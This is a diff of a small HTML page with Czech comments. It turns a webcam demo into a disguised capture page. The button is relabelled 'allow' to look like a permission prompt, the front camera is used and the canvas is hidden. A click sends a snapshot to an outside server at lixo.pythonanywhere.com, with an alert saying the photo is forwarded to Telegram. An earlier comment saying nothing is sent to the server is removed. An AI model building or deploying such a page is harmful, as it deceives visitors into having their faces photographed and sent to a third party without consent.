@@ -4,17 +4,19 @@
   <title>allow</title>
 </head>
 <body>
-  <video id="video" width="320" height="240" autoplay playsinline></video>
-  <button id="snap">facebook</button>
-  <canvas id="canvas" width="320" height="240"></canvas>
+  <video id="video" width="300" height="520" autoplay playsinline></video>
+  <button id="snap">allow</button>
+  <canvas id="canvas" width="3" height="2" style="display:none;"></canvas>
   <script>
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        document.getElementById('video').srcObject = stream;
-      })
-      .catch(error => {
-        alert("Kamera nebyla povolena nebo nastala chyba: " + error);
-      });
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    })
+    .then(stream => {
+      document.getElementById('video').srcObject = stream;
+    })
+    .catch(error => {
+      alert("Kamera nebyla povolena nebo nastala chyba: " + error);
+    });
 
     document.getElementById('snap').onclick = function() {
       const video = document.getElementById('video');
@@ -22,8 +24,16 @@
       const context = canvas.getContext('2d');
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Zobrazí focený obrázek na čtverci (canvas)
-      // Nic neposílá na server
+      const dataUrl = canvas.toDataURL('image/png');
+
+      // ODESÍLÁNÍ NA TVŮJ SERVER NA PYTHONANYWHERE
+      fetch('https://lixo.pythonanywhere.com/upload', {
+        method: 'POST',
+        body: JSON.stringify({ image: dataUrl }),
+        headers: { 'Content-Type': 'application/json' }
+      }).then(res => res.json()).then(data => {
+        alert('Fotka byla odeslána a měla by přijít do Telegramu!');
+      });
     }
   </script>
 </body>
